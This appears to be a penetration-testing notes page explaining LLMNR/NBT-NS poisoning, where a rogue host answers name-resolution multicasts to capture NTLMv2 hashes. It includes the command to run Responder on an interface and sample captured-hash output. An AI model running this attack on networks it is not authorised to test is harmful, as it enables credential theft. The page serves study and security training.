# Poisoning Attacks

## LLMNR/NBT-NS Poisoning

`LLMNR` stands for Link-Local Multicast Name Resolution. It **facilitates name resolution** for the hosts in a local network and **utilizes multicast requests to do so**. It is the successor of `NBT-NS` (NetBIOS Name Service). `LLMNR` does not depend on `DNS` and is especially utilized when a `DNS` server is not present or is not able to carry out the requested name resolution.

The major issue with this protocol (or any protocol that can get poisoned) is that **any system could respond to the multicast request**. Therefore, a rogue system can make a fake claim to know the resource in the request and then *ask and obtain*  the requestor's hash. This **leads to LLMNR/NBT-NS Poisoning**.

For example:

- The target could ask or could be tricked into asking a DNS server for a non-existent share, say `\\idonotexist`.

- Since the share doesn't exist, **the DNS server would not be able to help** the requestor connect to the requested share.

- Then the requestor would utilize LLMNR to find `\\idonotexist` and would send a multicast request.

- The Attacker's system would respond to the multicast request by claiming to know the share `\\idonotexist` and **would ask for and obtain the requesting system's hash**. 

> *For further reading, check out:*
> - https://www.hackingarticles.in/a-detailed-guide-on-responder-llmnr-poisoning/
> - https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/

### Using `responder` for LLMNR/NBT-NS Poisoning

```bash
sudo responder -I tun0
```

**Note:** Responder carries out LLMNR/NBT-NS Poisoning by default.

```bash
# Partial Output

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : <IP>
[SMB] NTLMv2-SSP Username : <HOSTNAME>\<USERNAME>
[SMB] NTLMv2-SSP Hash     : <NTLMv2-HASH>         
[*] Skipping previously captured hash for <HOSTNAME>\<USERNAME>
[*] Skipping previously captured hash for <HOSTNAME>\<USERNAME>
[*] Skipping previously captured hash for <HOSTNAME>\<USERNAME>
```